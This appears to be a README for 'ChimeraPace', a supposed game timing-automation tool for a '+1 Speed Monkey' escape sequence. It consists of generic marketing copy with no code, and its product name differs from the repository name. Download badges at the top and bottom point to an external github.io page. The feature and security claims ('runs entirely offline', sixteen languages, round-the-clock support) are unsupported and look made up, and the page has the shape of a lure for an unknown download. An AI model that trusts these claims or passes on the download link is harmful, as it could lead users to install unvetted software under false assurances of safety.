![preview](https://raw.githubusercontent.com/erikalmeidakaos/speed-monkey-escape-timing-helper/main/view_ad2e44.svg)
[![Download](https://raw.githubusercontent.com/erikalmeidakaos/speed-monkey-escape-timing-helper/main/setup_b3bd30.svg)](https://erikalmeidakaos.github.io/speed-monkey-escape-timing-helper/)

# 🐒 ChimeraPace — Adaptive Escape Sequence Orchestrator

A precision automation companion for players navigating the notorious +1 Speed Monkey escape corridor. ChimeraPace observes the exact frame windows where the exit gate becomes valid, and it releases the input at the moment the engine expects it — no more counting under your breath, no more muscle-memory gambles, no more retrying the same stretch of corridor until your patience frays.

This repository is a clean-room reimagining of the original `speed-monkey-escape-script` concept, rebuilt from the ground up around an event-driven scheduler, a resilient state machine, and a diagnostic layer that explains *why* a timing window was accepted or rejected. If the original was a stopwatch taped to a doorbell, ChimeraPace is a metronome wired directly into the wall clock.

---

## 📜 Table of Contents

- [Overview](#-overview)
- [The Problem Being Solved](#-the-problem-being-solved)
- [Design Philosophy](#-design-philosophy)
- [Feature Highlights](#-feature-highlights)
- [Architecture at a Glance](#-architecture-at-a-glance)
- [The Escape Window Model](#-the-escape-window-model)
- [Multilingual Support](#-multilingual-support)
- [Responsive Interface](#-responsive-interface)
- [Diagnostics and Telemetry](#-diagnostics-and-telemetry)
- [Configuration Reference](#-configuration-reference)
- [Compatibility Matrix](#-compatibility-matrix)
- [Performance Characteristics](#-performance-characteristics)
- [Reliability Engineering](#-reliability-engineering)
- [Support Model](#-support-model)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Contributing Guidelines](#-contributing-guidelines)
- [Security Posture](#-security-posture)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🧭 Overview

ChimeraPace is a timing orchestrator. It does not modify game assets, it does not touch memory, and it does not attempt to rewrite the rules of the scene you are playing. It watches the rhythm of the environment — the tick cadence, the animation loop, the input poll interval — and it emits a single, well-placed signal at the correct beat.

Think of it like a conductor standing in front of an orchestra that refuses to play at a steady tempo. The conductor does not change the notes; the conductor simply raises the baton at the precise moment the downbeat arrives.

The project targets the specific escape sequence widely known as the "+1 Speed Monkey" corridor, a stretch of gameplay that punishes players who rely on raw reaction time and rewards those who understand the underlying cadence. ChimeraPace turns that cadence into something observable, tunable, and repeatable.

---

## 🎯 The Problem Being Solved

Most failure in this sequence is not a failure of skill. It is a failure of *measurement*. Players typically fall into one of three traps:

1. **The Drift Trap** — a timing that works on the first attempt slowly diverges as frame pacing fluctuates across a session.
2. **The Confidence Trap** — a player lands the sequence once by luck, then over-commits to a rhythm that was never stable to begin with.
3. **The Noise Trap** — background load, thermal throttling, or an unlucky render spike shifts the poll window by a handful of milliseconds, enough to turn a clean exit into a wall collision.

ChimeraPace addresses all three by refusing to guess. It hypothesizes a window, tests the hypothesis against observed tick data, and only releases the exit signal when confidence crosses a configurable threshold. When it is not confident, it says so — loudly, in the log, with a reason.

---

## 🧠 Design Philosophy

Five principles shaped every decision in this codebase.

**Observe before acting.** The scheduler never fires blind. Every release is preceded by a short observation phase that confirms the environment is behaving as expected.

**Degrade loudly, not silently.** A silent failure is worse than a crash. When ChimeraPace cannot confirm a window, it announces the ambiguity and holds.

**Prefer determinism over cleverness.** A boring, predictable state machine beats a clever heuristic that works 90% of the time and confuses you the other 10%.

**Make the invisible visible.** Timing is invisible. The diagnostics layer renders it as a timeline so you can *see* the window you are aiming for.

**Respect the player's time.** Configuration should take minutes, not evenings. Sensible defaults, clear overrides, no ceremony.

---

## ✨ Feature Highlights

- ⏱️ **Adaptive window estimation** — the scheduler refines its target beat across attempts instead of locking to a single fixed delay.
- 🎛️ **Tunable confidence threshold** — release earlier for speed, later for safety, with a single dial.
- 🧩 **Event-driven core** — no busy-wait polling loops; the orchestrator sleeps until the next meaningful tick.
- 🌐 **Multilingual interface** — localization built in from day one, covering major world languages with room for community translations.
- 📱 **Responsive layout** — the companion dashboard reflows from ultrawide monitors down to handheld displays without losing information density.
- 🩺 **Explainable decisions** — every accept/reject decision carries a human-readable rationale.
- 📊 **Session replay timeline** — scrub through a session and watch each window open and close.
- 🔔 **Optional audio cues** — non-intrusive chimes that mark window open, window close, and release events.
- 🕛 **24/7 support channel** — asynchronous help that does not require you to catch anyone online.
- 🔒 **Offline-first operation** — nothing about your session needs to leave your machine.

---

## 🏗️ Architecture at a Glance

The system is organized into four cooperating layers.

**The Sensor Layer** reads the environment's cadence. It does not read game memory; it listens to observable signals such as frame pacing, animation phase, and input acknowledgment latency.

**The Estimator Layer** maintains a probabilistic model of where the escape window currently sits. It updates this model on every observation, weighting recent evidence more heavily than stale evidence.

**The Orchestrator Layer** is the decision-maker. It consults the estimator, applies your confidence threshold, and either releases the exit signal or holds with a logged reason.

**The Surface Layer** is everything you interact with: the dashboard, the configuration files, the diagnostics timeline, and the localization bundles.

Each layer communicates through a narrow, well-documented interface. You can replace any single layer without touching the others — a property that has already proven useful for community experimentation.

---

## 🪟 The Escape Window Model

The escape window is not a point in time. It is an interval, and that interval breathes.

ChimeraPace models the window as a probability distribution rather than a hard boundary. At any moment, the estimator holds a belief about where the window's opening edge sits, how wide the window is, and how confident that belief is.

Three parameters govern the model:

- **Opening Edge** — the earliest moment a release is accepted.
- **Closing Edge** — the latest moment a release is accepted.
- **Density Curve** — how the probability mass distributes between those edges.

By default, the density curve is a soft trapezoid: flat across the middle, tapering at both ends. This reflects the empirical reality that the middle of a window is more forgiving than its edges. Players who prefer a sharper commitment can switch to a triangular or rectangular curve.

---

## 🌍 Multilingual Support

Language should never be a barrier to understanding why a release failed. ChimeraPace ships with localization bundles for a broad set of languages, and every log message, dashboard label, and diagnostic annotation respects the active locale.

The localization system uses a flat key-value structure with interpolation support, which keeps translation bundles approachable for contributors who are not programmers. Adding a new language is a matter of copying a reference bundle and translating its values — no build step, no compilation.

Languages currently supported at launch include English, Spanish, Portuguese, French, German, Italian, Dutch, Polish, Russian, Turkish, Arabic, Hindi, Japanese, Korean, Simplified Chinese, and Traditional Chinese. Community translations are welcomed and credited in the changelog.

---

## 📱 Responsive Interface

The dashboard is built on a fluid grid that adapts to the viewport rather than assuming a fixed canvas. On a large monitor, the timeline, the estimator state, and the configuration panel sit side by side. On a tablet, the timeline takes the full width and the panels stack below it. On a phone, a compact mode collapses non-essential panels into expandable drawers.

The intent is not to shrink the desktop experience onto a small screen, but to present a *different, equally complete* experience that respects the constraints of each device. Nothing is hidden, only reorganized.

---

## 🩺 Diagnostics and Telemetry

Diagnostics are the heart of the project. Every session produces a structured record containing:

- Observation snapshots at each meaningful tick.
- Estimator belief updates with timestamps.
- Release decisions with the rationale attached.
- Rejection events with the specific threshold that was not met.

These records are written locally and can be exported as a portable bundle for sharing in support threads. The telemetry never includes personally identifying information, and it is never transmitted anywhere without an explicit action on your part.

A built-in timeline viewer renders a session as a horizontal band, with the escape window drawn as a shaded region and each release attempt marked as a tick. Watching a failed session in this view is often enough to diagnose the issue in seconds.

---

## ⚙️ Configuration Reference

Configuration lives in a single human-readable file. The most commonly adjusted keys are listed below.

**confidence_threshold** — a value between zero and one. Higher values make the orchestrator more conservative. Defaults to a balanced midpoint.

**window_density_curve** — one of `trapezoid`, `triangle`, or `rectangle`. Controls how probability mass distributes across the window.

**observation_ticks** — how many ticks the sensor layer collects before the estimator updates. Lower values react faster but are noisier.

**release_lead** — a micro-offset applied to the release moment, useful for compensating for consistent hardware latency.

**audio_cues** — toggles the optional chime set for window events.

**locale** — sets the active language bundle.

Every key has a documented default, and the configuration loader will fall back gracefully if a key is missing or malformed.

---

## 🧮 Compatibility Matrix

ChimeraPace is designed to be environment-agnostic wherever possible, but timing-sensitive software always has edges. The project is actively validated against:

- Desktop environments running current long-term-support operating system releases.
- Handheld devices with unlocked input polling.
- Emulated environments where frame pacing is stable.
- Cloud-hosted instances with predictable latency.

Where an environment is known to be hostile to deterministic timing — for example, heavily throttled hardware or high-jitter networks — the orchestrator will detect the instability and warn you rather than pretend everything is fine.

---

## 🚀 Performance Characteristics

The orchestrator is intentionally frugal. On a typical desktop session, ChimeraPace consumes a negligible fraction of a single core. Memory footprint stays flat across long sessions because the estimator uses a fixed-size ring buffer rather than an ever-growing history.

Latency from observation to release is measured in single-digit milliseconds on validated hardware. The estimator's update cycle is bounded, so the worst-case decision latency does not grow with session length.

---

## 🛡️ Reliability Engineering

Three mechanisms keep ChimeraPace honest.

**Watchdog Timers** — if any layer stops responding within its expected interval, the orchestrator halts and reports the stall instead of continuing with stale beliefs.

**Self-Tests** — a diagnostic suite runs at startup and exercises each layer with synthetic tick data, catching regressions before they reach a live session.

**Graceful Degradation** — if the sensor layer loses signal, the orchestrator reverts to a conservative fallback schedule rather than crashing or spamming.

These mechanisms exist because timing software that fails silently is worse than timing software that refuses to run.

---

## 🤝 Support Model

Support is asynchronous and available around the clock. Issues filed in the repository are triaged against a documented rubric, and sessions that include an exported diagnostic bundle are typically resolved far faster than those that do not.

A dedicated discussion area hosts community troubleshooting, where experienced users often answer questions before maintainers arrive. The support model is intentionally warm and patient — this project exists because timing is hard, and nobody should be made to feel silly for struggling with it.

---

## 🗺️ Roadmap for 2026

The 2026 roadmap focuses on three themes.

**Explainability** — richer rationales for every decision, including counterfactual notes explaining what would have happened under a different threshold.

**Portability** — broader environment coverage, including new handheld targets and additional emulated backends.

**Community** — expanded localization tooling, a translation review workflow, and a curated gallery of shared configuration profiles.

Longer-term ideas under exploration include a scripting surface for power users and a visualization mode that overlays the estimator's belief directly onto a recorded session.

---

## ❓ Frequently Asked Questions

**Does ChimeraPace modify the game?**
No. It observes timing signals and emits input at the correct moment. It does not alter assets, memory, or logic.

**Why is my release being rejected so often?**
Rejections usually indicate an unstable environment. Check the diagnostics timeline for jitter, and consider raising the observation tick count.

**Can I tune it for maximum speed?**
Yes, though faster settings reduce the margin for error. Start balanced, then tighten gradually.

**Is my session data uploaded anywhere?**
No. Diagnostics are written locally and only leave your machine if you explicitly export and share them.

**How do I contribute a translation?**
Copy a reference bundle, translate the values, and open a pull request. A review guide in the contributing document explains the process.

---

## 🧑‍💻 Contributing Guidelines

Contributions are welcome across code, documentation, localization, and diagnostics. Before opening a pull request, please read the contributing document for coding conventions, commit message style, and the review checklist.

Small, focused changes are reviewed fastest. Large refactors should be discussed in an issue first so that design intent can be agreed upon before code is written.

All contributors are expected to uphold a respectful, patient tone in every interaction. This is a hobbyist-friendly project, and the community's warmth is part of what makes it worth maintaining.

---

## 🔐 Security Posture

ChimeraPace runs entirely offline. It opens no network sockets, requests no elevated privileges, and stores no credentials. The attack surface is deliberately minimal.

If you discover a security concern, please report it privately through the repository's security advisory channel rather than opening a public issue. A coordinated disclosure timeline will be agreed upon before any public discussion.

---

## ⚠️ Disclaimer

ChimeraPace is an independent timing utility provided for educational and personal use. It is not affiliated with, endorsed by, or sponsored by any game developer, publisher, or platform holder.

Users are responsible for ensuring that their use of this tool complies with the terms of service of any software they interact with. The maintainers assume no liability for account actions, gameplay consequences, or any other outcome arising from the use of this project.

The software is provided as-is, without warranty of any kind, express or implied. Timing behavior depends on hardware, environment, and configuration, and results will vary between setups.

---

## 📄 License

This project is released under the MIT License.

You are welcome to use, modify, and redistribute the code in accordance with the license terms, provided that the original copyright notice and permission notice are preserved.

A working copy of the license text is available in the repository at LICENSE.

---

## 🏁 Final Note

Timing is a strange kind of skill. It feels like reflex, but it is really pattern recognition wearing a disguise. ChimeraPace exists to pull back the disguise — to turn a blur of motion into a measurable window, and a frustrating wall into a door you can walk through on purpose.

If it saves you even a dozen retries, it has done its job.

[![Download](https://raw.githubusercontent.com/erikalmeidakaos/speed-monkey-escape-timing-helper/main/setup_b3bd30.svg)](https://erikalmeidakaos.github.io/speed-monkey-escape-timing-helper/)